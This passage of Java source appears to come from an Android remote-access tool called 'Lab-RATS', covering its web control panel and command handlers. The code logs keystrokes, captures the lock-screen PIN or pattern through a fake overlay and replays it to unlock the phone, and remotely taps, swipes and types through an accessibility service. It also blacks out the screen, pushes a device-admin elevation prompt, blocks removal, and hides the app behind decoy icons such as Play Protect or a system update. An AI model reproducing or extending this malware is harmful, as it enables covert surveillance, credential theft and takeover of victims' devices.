        html.append("    .toast-config-row { display: flex !important; flex-direction: row !important; align-items: flex-end !important; gap: 15px !important; flex-wrap: nowrap !important; }");
        html.append("    .toast-config-row > div { flex: 0 1 auto !important; width: auto !important; min-width: 0 !important; }");
        html.append("    .toast-range { width: 200px !important; }");
        html.append("    #toast-anim { width: 260px !important; max-width: 260px !important; height: 42px !important; padding: 10px !important; border: 1px solid var(--neon-yellow) !important; font-size: 0.7rem !important; }");
        html.append("  }");
        html.append("  @media (max-width: 768px) {");
        html.append("    .toast-config-row { display: grid !important; grid-template-columns: 1fr !important; gap: 20px !important; }");
        html.append("    .toast-range { width: 100% !important; max-width: 100% !important; }");
        html.append("    #toast-anim { width: 100% !important; max-width: 100% !important; height: 45px !important; }");
        html.append("  }");
        html.append("</style>");

        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px; margin-bottom: 20px; margin-top: 20px;\">");
        html.append("<input id=\"toast-msg\" type=\"text\" placeholder=\"Message Content\" maxlength=\"150\" style=\"background: #000; border: 1px solid var(--neon-yellow); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<button type=\"button\" onclick=\"sendEnhancedToast()\" class=\"btn\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); width: 210px !important; margin: 0;\">SEND_TOAST</button>");
        html.append("</div>");

        // Color Picker Row
        html.append("<div style=\"display:flex; align-items:center; gap:12px; margin-bottom:20px; position:relative;\">");
        html.append("<div class=\"info-label\" style=\"margin-bottom:0; font-size:0.8rem; color:#888;\">TEXT_COLOR:</div>");
        html.append("<div id=\"toast-color-btn\" onclick=\"toggleColorPicker(event)\" style=\"width:18px; height:18px; background:#FFFFFF; border:1px solid #555; border-radius:50%; cursor:pointer; transition:0.2s;\"></div>");
        html.append("<div id=\"color-picker-palette\" onclick=\"event.stopPropagation()\" style=\"display:none; position:absolute; left:120px; bottom:0; background:#111; border:1px solid #333; padding:10px; border-radius:10px; z-index:100; box-shadow:0 10px 30px rgba(0,0,0,0.8); grid-template-columns:repeat(5, 1fr); gap:8px;\">");
        String[] toastColors = {"#FFFFFF", "#FF3131", "#39FF14", "#00F2FF", "#FFFF00", "#FF9D00", "#9B59B6", "#FF00FF", "#0088FF", "#888888"};
        for (String c : toastColors) {
            html.append("<div onclick=\"pickToastColor('").append(c).append("')\" style=\"width:24px; height:24px; background:").append(c).append("; border-radius:4px; border:1px solid rgba(255,255,255,0.1); cursor:pointer;\"></div>");
        }
        html.append("</div>");
        html.append("<input type=\"hidden\" id=\"toast-color-val\" value=\"#FFFFFF\">");
        html.append("</div>");

        html.append("<div class=\"toast-config-row\" style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px;\">");
        
        // 1. Font Size
        html.append("<div>");
        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem; color: #888;\">FONT_SIZE: <span id=\"size-val\">22</span></div>");
        html.append("<input type=\"range\" id=\"toast-size\" min=\"10\" max=\"60\" value=\"22\" oninput=\"document.getElementById('size-val').innerText=this.value\" style=\"width: 100%; accent-color: var(--neon-yellow);\" class=\"toast-range\">");
        html.append("</div>");

        // 2. Y Position
        html.append("<div>");
        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem; color: #888;\">V_OFFSET: <span id=\"y-val\">250</span></div>");
        html.append("<input type=\"range\" id=\"toast-y\" min=\"0\" max=\"1800\" value=\"250\" oninput=\"document.getElementById('y-val').innerText=this.value\" style=\"width: 100%; accent-color: var(--neon-yellow);\" class=\"toast-range\">");
        html.append("</div>");

        // 3. Duration
        html.append("<div>");
        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem; color: #888;\">DURATION: <span id=\"dur-val\">12000</span>ms</div>");
        html.append("<input type=\"range\" id=\"toast-dur\" min=\"1000\" max=\"30000\" step=\"500\" value=\"12000\" oninput=\"document.getElementById('dur-val').innerText=this.value\" style=\"width: 100%; accent-color: var(--neon-yellow);\" class=\"toast-range\">");
        html.append("</div>");

        html.append("<div>");
        html.append("<div class=\"info-label\" style=\"font-size: 0.8rem; color: #888;\">ANIMATION_STYLE</div>");
        html.append("<select id=\"toast-anim\" style=\"width: 260px !important; max-width: 260px !important; height: 42px; background: #000; border: 1px solid var(--neon-yellow); color: #fff; padding: 10px; border-radius: 6px; outline: none; font-family: monospace; font-size: 0.7rem;\">");
        html.append("<option value=\"scroll\">SCROLL_HORIZONTAL</option>");
        html.append("<option value=\"pop\">POP_IN_OUT</option>");
        html.append("<option value=\"static\">STATIC_FADE</option>");
        html.append("<option value=\"burnt\">BURNT_TOAST (PRANK)</option>");
        html.append("</select>");
        html.append("</div>");

        html.append("</div>"); // Close grid/row
        html.append("</div>"); // Close GHOST_TOAST card

        // Ghost Keylogs Section
        html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"display: block !important;\">");
        html.append("<div class=\"flex-header\">");
        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
        html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 12px;\">PURGE_LOGS</button>");
        html.append("</div>");
        
        html.append("<div id=\"ghost-terminal\" class=\"terminal-text\" style=\"height:480px; min-height:450px; overflow-y:auto; white-space:pre-wrap; border:1px solid rgba(0, 242, 255, 0.1); margin-top: 15px;\">");
        html.append("[WAITING_FOR_UPLINK] Monitoring focused app input...");
        html.append("</div>");
        html.append("</div>");

        html.append("</div>");
        html.append("<script>")
            .append("function pollGhostStatus() {")
            .append("  fetch('/ghost/status').then(r => r.json()).then(data => {")
            .append("    const badge = document.getElementById('keyguard-watcher-badge');")
            .append("    const bypassBtn = document.getElementById('bypass-lock-btn');")
            .append("    if (badge) {")
            .append("      if (data.hasCredential) {")
            .append("        badge.style.borderColor = 'var(--neon-green)';")
            .append("        badge.style.color = 'var(--neon-green)';")
            .append("        badge.style.background = 'rgba(57, 255, 20, 0.08)';")
            .append("        badge.innerHTML = '&#10004; CREDENTIAL_CAPTURED (' + data.credentialType + (data.capturedPin ? ': ' + data.capturedPin : '') + ')';")
            .append("        if (bypassBtn) {")
            .append("          bypassBtn.style.borderColor = 'var(--neon-green)';")
            .append("          bypassBtn.style.color = 'var(--neon-green)';")
            .append("          bypassBtn.style.background = 'rgba(57, 255, 20, 0.12)';")
            .append("          bypassBtn.innerHTML = '&#128275; BYPASS_LOCKSCREEN (READY)';")
            .append("        }")
            .append("      } else {")
            .append("        badge.style.borderColor = '#555';")
            .append("        badge.style.color = '#888';")
            .append("        badge.style.background = 'rgba(255,255,255,0.03)';")
            .append("        badge.innerHTML = '&#9203; STATUS: WAITING_FOR_USER_UNLOCK';")
            .append("        if (bypassBtn) {")
            .append("          bypassBtn.style.borderColor = 'var(--neon-cyan)';")
            .append("          bypassBtn.style.color = 'var(--neon-cyan)';")
            .append("          bypassBtn.style.background = 'rgba(0, 242, 255, 0.05)';")
            .append("          bypassBtn.innerHTML = '&#128275; BYPASS_LOCKSCREEN';")
            .append("        }")
            .append("      }")
            .append("    }")
            .append("  }).catch(e => {});")
            .append("}")
            .append("setInterval(pollGhostStatus, 2000);")
            .append("pollGhostStatus();")
            .append("</script>");

        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveKeystrokes() {
        org.json.JSONArray array = new org.json.JSONArray();
        for (String key : IO_Persistence_Manager.getKeystrokes()) {
            array.put(key);
        }
        try {
            org.json.JSONObject obj = new org.json.JSONObject();
            obj.put("keys", array);
            return newResponse(Response.Status.OK, "application/json", obj.toString());
        } catch (Exception e) { return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage()); }
    }

    private Response performInteraction(Map<String, String> params) {
        String action = params.get("action");
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        
        if (action == null) return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "No action");

        if (action.equals("settings")) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Intent settingsIntent = getSettingsIntent();
                    if (settingsIntent != null) {
                        context.startActivity(settingsIntent);
                    }
                } catch (Exception e) {
                    try {
                        Intent fallback = new Intent(android.provider.Settings.ACTION_SETTINGS);
                        fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(fallback);
                    } catch (Exception ignored) {}
                }
            });
            return newResponse(Response.Status.OK, "application/json", "{\"success\":true}");
        }

        if (action.equals("os_lock") || action.equals("oslock")) {
            return triggerOsLock();
        }

        if (action.equals("elevateAdmin") || action.equals("elevate_admin") || action.equals("admin")) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                        .edit().putBoolean("is_repairing", true).apply();
                    IO_Persistence_Manager.setAutoPilot(true);
                    IO_Persistence_Manager.stopSmartExit();

                    Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
                    wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                    wrapperIntent.putExtra("launch_admin", true);
                    context.startActivity(wrapperIntent);

                    com.labs.labrats.FirebaseConfig.logActivity("GHOST_CONTROL: Device Admin elevation prompt dispatched");
                } catch (Exception e) {
                    android.util.Log.e("GhostModule", "Failed to launch device admin wrapper: " + e.getMessage());
                }
            });
            return newResponse(Response.Status.OK, "application/json", "{\"success\":true}");
        }

        if (ghost == null) return newResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"Ghost Service Offline\"}");

        if (IO_Persistence_Manager.isLockActive() && !action.equals("lock") && !action.equals("settings")) {
            return newResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"SYSTEM_LOCK_ACTIVE\"}");
        }

        boolean success = false;
        switch (action) {
            case "click":
                if (params.containsKey("px") && params.containsKey("py")) {
                    float px = Float.parseFloat(params.get("px"));
                    float py = Float.parseFloat(params.get("py"));
                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
                    int realX = (int) (px * sw / 100);
                    int realY = (int) (py * sh / 100);
                    success = ghost.clickAt(realX, realY);
                }
                break;
            case "scroll_up":
                success = ghost.performScroll("up");
                break;
            case "scroll_down":
                success = ghost.performScroll("down");
                break;
            case "scroll_left":
                success = ghost.performScroll("left");
                break;
            case "scroll_right":
                success = ghost.performScroll("right");
                break;
            case "swipe_up":
            case "menu":
                {
                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        try { ghost.performGlobalAction(14); } catch (Exception ignored) {}
                    }
                    int startX = sw / 2;
                    int startY = (int) (sh * 0.85);
                    int endY = (int) (sh * 0.20);
                    success = ghost.swipe(startX, startY, startX, endY, 350);
                }
                break;
            case "swipe_down":
                {
                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
                    success = ghost.swipe(sw / 2, (int)(sh * 0.15), sw / 2, (int)(sh * 0.85), 280);
                }
                break;
            case "swipe":
                if (params.containsKey("px1") && params.containsKey("py1") && params.containsKey("px2") && params.containsKey("py2")) {
                    float px1 = Float.parseFloat(params.get("px1"));
                    float py1 = Float.parseFloat(params.get("py1"));
                    float px2 = Float.parseFloat(params.get("px2"));
                    float py2 = Float.parseFloat(params.get("py2"));
                    int d = params.containsKey("d") ? Integer.parseInt(params.get("d")) : 300;
                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
                    int x1 = (int) (px1 * sw / 100);
                    int y1 = (int) (py1 * sh / 100);
                    int x2 = (int) (px2 * sw / 100);
                    int y2 = (int) (py2 * sh / 100);
                    success = ghost.swipe(x1, y1, x2, y2, d);
                }
                break;
            case "home":
                success = ghost.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case "back":
                success = ghost.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case "recents":
                success = ghost.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
            case "blackout":
            case "toggle_blackout":
                ghost.startBlackout(!IO_Persistence_Manager.isBlackoutActive());
                success = true;
                break;
            case "blackout_on":
                ghost.startBlackout(true);
                success = true;
                break;
            case "blackout_off":
                ghost.startBlackout(false);
                success = true;
                break;
            case "bypass_lockscreen":
            case "unlock_lockscreen":
                {
                    IO_Persistence_Manager.lastBypassRequestedTime = System.currentTimeMillis();
                    String capturedPin = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("captured_pin", "");
                    String capturedPattern = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("captured_pattern", "");

                    boolean screenWasOff = false;
                    try {
                        android.os.PowerManager pm = (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
                        if (pm != null && !pm.isInteractive()) {
                            screenWasOff = true;
                        }
                    } catch (Exception ignored) {}

                    ghost.wakeUpScreen();

                    if (capturedPin.isEmpty() && capturedPattern.isEmpty()) {
                        Log.w("GhostModule", "BYPASS_LOCKSCREEN: No stored credential - Deploying PIN Harvest Overlay...");
                        deployOverlay(java.util.Collections.singletonMap("type", "pin"));
                    } else {
                        Log.i("GhostModule", "BYPASS_LOCKSCREEN: Replaying stored credential to bypass lockscreen...");
                        long delay = screenWasOff ? 800L : 200L;
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            ghost.autoUnlockDevice();
                        }, delay);
                    }
                }
                success = true;
                break;
            case "autoheal":
                ghost.runAutoHeal();
                success = true;
                break;
            case "toggleAntiRemoval":
                IO_Persistence_Manager.setAntiRemovalEnabled(!IO_Persistence_Manager.isAntiRemovalEnabled());
                success = true;
                break;
            case "type":
                if (params.containsKey("text")) {
                    ghost.typeText(params.get("text"));
                    success = true;
                }
                break;
        }

        return newResponse(Response.Status.OK, "application/json", "{\"success\":" + success + "}");
    }

    private Intent getSettingsIntent() {
        android.content.ComponentName componentName = new android.content.ComponentName(context, IO_Persistence_Manager.class);
        String serviceId = componentName.flattenToString();
        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.putExtra(":settings:fragment_args_key", serviceId);
        android.os.Bundle bundle = new android.os.Bundle();
        bundle.putString(":settings:fragment_args_key", serviceId);
        intent.putExtra(":settings:show_fragment_args", bundle);
        return intent;
    }

    private Response toggleStealthMode(Map<String, String> params) {
        try {
            String type = params.get("type");
            boolean forceRestore = "restore".equals(params.get("action"));
            boolean autoPilotToggle = "autopilot".equals(params.get("action"));
            
            if (autoPilotToggle) {
                boolean currentState = IO_Persistence_Manager.isAutoPilotEngaged();
                boolean newState = !currentState;
                IO_Persistence_Manager.setAutoPilot(newState);
                return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"autopilot\": " + newState + "}");
            }

            if (forceRestore) {
                SystemAnalytics.setStealthMode(context, false);
                return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": false}");
            } else {
                if (type != null) {
                    int choice = 1; // Play Protect (Default / SettingsAlias)
                    if (type.equals("calc")) choice = 2;
                    else if (type.equals("weather")) choice = 3;
                    else if (type.equals("update")) choice = 4; // System Update
                    else if (type.equals("smarttutor") || type.contains("tutor")) choice = 5; // Smart Tutor
                    else if (type.equals("logo") || type.equals("labrats")) choice = 6; // Lab-RATS Logo (Unmasked)
                    else if (type.equals("systemstability") || type.contains("stability") || type.equals("launcher")) choice = 7; // System Stability Service (Unmasked)
                    
                    SystemAnalytics.setDecoyChoice(context, choice);
                }
                
                SystemAnalytics.setStealthMode(context, true);
                return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": true}");
            }
        } catch (Exception e) {
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Stealth error: " + e.getMessage());
        }
    }

}
